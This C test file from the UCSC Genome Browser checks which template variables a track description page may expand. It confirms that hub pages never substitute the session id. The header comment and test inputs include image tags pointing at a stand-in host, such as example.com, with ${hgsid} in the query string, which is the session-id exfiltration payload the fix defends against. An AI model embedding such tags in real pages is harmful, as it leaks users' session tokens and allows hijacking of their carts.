/* hVarSubstHtmlTester - check which variables a track description page may use.
 *
 * hVarSubstTrackDbHtml() runs over a track's description page at render time.  How much it
 * is allowed to substitute depends on where the page came from, and #38283 is that split.
 *
 * A NATIVE page has already been through hgTrackDb, which resolved everything it could and
 * deferred only ${hgsid}, since a session id is per-request and cannot be baked into the
 * trackDb table.  So this pass acts on ${hgsid} alone, and only in braces: hgTrackDb turns
 * an escaped $$hgsid into a literal $hgsid, and acting on the bare form here would expand
 * the very thing the author escaped.
 *
 * A HUB page comes straight off somebody else's web server and has never been substituted,
 * so the whole hub list is resolved here -- and $hgsid is deliberately NOT on that list.  A
 * hub's page is only lightly sanitized, an <img> with an http src survives it, and a page
 * containing <img src="https://example.com/px?s=${hgsid}"> would hand the reader's session
 * id to the hub's own server.  A session id alone is enough to read and write that cart.
 *
 * That last one is the case this test exists for, and it is invisible twice over: the page
 * renders identically either way, and the leak is a request to somebody else's host.
 *
 * It needs a cart to pin, and that is worth saying because the obvious cheaper version does
 * not work.  A run with no cart leaves ${hgsid} on the page whether or not hgsid is on the
 * hub list, because the check that recognises a variable also asks whether this call can
 * resolve it, and with no cart it cannot.  Adding hgsid back to hubHtmlVars was tried
 * against a cartless version of this test and changed not one line of its output.  So the
 * cart below is built by hand -- cartSessionId reads two fields of it and nothing else, so
 * no database is involved -- and the assertion is that a hub page still carries the literal
 * ${hgsid} while a native page has it replaced by the session id.
 *
 * refs #38283 */

/* Copyright (C) 2026 The Regents of the University of California
 * See kent/LICENSE or http://genome.ucsc.edu/license/ for licensing information. */

#include "common.h"
#include "hash.h"
#include "trackDb.h"
#include "cart.h"
#include "cartDb.h"
#include "hVarSubst.h"

/* An assembly that is certainly present, for the variables that ask hdb about one. */
#define DB "hg38"

static struct cart *fakeCart()
/* A cart with just enough in it for cartSessionId, which reads the session id and key and
 * nothing else.  No database: a real cart would need hgcentral, and what is being tested
 * here is which variables are allowed, not where a session comes from. */
{
struct cartDb *sessionInfo;
AllocVar(sessionInfo);
sessionInfo->id = 12345;
sessionInfo->sessionKey = cloneString("abcdef");
struct cart *cart;
AllocVar(cart);
cart->sessionInfo = sessionInfo;
return cart;
}

static void showWith(struct cart *cart, char *what, char *trackName, char *html)
/* Run one description page through the substitution and print what came out. */
{
struct trackDb *tdb;
AllocVar(tdb);
tdb->track = cloneString(trackName);
tdb->table = cloneString(trackName);
tdb->type = cloneString("bed 3 .");
tdb->settings = cloneString("");
tdb->settingsHash = trackDbSettingsFromString(tdb, tdb->settings);
tdb->html = cloneString(html);

hVarSubstTrackDbHtml(cart, tdb, DB);
printf("  %-30s %-34s -> %s\n", what, html, tdb->html);
}

static void show(char *what, char *trackName, char *html)
/* The common case: a render with a session, which is what a CGI always has. */
{
showWith(fakeCart(), what, trackName, html);
}

static void hubPage()
/* track names beginning hub_ take the hub list. */
{
char *track = "hub_1_myTrack";
printf("a hub's description page\n");
show("$db resolves", track, "<p>assembly $db</p>");
show("${db} in braces too", track, "<p>assembly ${db}</p>");
show("$$db stays a dollar", track, "<p>$$db</p>");
show("$hgsid is NOT a variable", track, "<img src=\"http://x/p?s=$hgsid\">");
show("${hgsid} is NOT a variable", track, "<img src=\"http://x/p?s=${hgsid}\">");
show("a price is not a variable", track, "<p>costs $5 million</p>");
}

static void nativePage()
/* Any other track name is a native page, already substituted once by hgTrackDb. */
{
char *track = "knownGene";
printf("\na native description page\n");
show("${hgsid} is acted on", track, "<a href=\"x?hgsid=${hgsid}\">go</a>");
show("$hgsid is left alone", track, "<a href=\"x?hgsid=$hgsid\">go</a>");
show("$db was done by hgTrackDb", track, "<p>assembly $db</p>");
show("a price is not a variable", track, "<p>costs $5 million</p>");
}

static void noSession()
/* hgTrackDb and the command line have no cart.  Nothing may be invented there, and nothing
 * may crash. */
{
printf("\nwith no cart at all\n");
showWith(NULL, "hub page, ${hgsid}", "hub_1_myTrack",
         "<img src=\"http://x/p?s=${hgsid}\">");
showWith(NULL, "native page, ${hgsid}", "knownGene",
         "<a href=\"x?hgsid=${hgsid}\">go</a>");
showWith(NULL, "hub page, $db", "hub_1_myTrack", "<p>assembly $db</p>");
}

static void nothingToDo()
/* The cases that must not crash or invent a page. */
{
printf("\nnothing to substitute\n");
show("no dollar at all", "knownGene", "<p>plain</p>");
show("empty page", "knownGene", "");

struct trackDb *tdb = NULL;
hVarSubstTrackDbHtml(fakeCart(), tdb, DB);
printf("  %-30s %s\n", "a NULL track", "returned, no crash");
}

int main(int argc, char *argv[])
{
hubPage();
nativePage();
noSession();
nothingToDo();
printf("\n");
return 0;
}
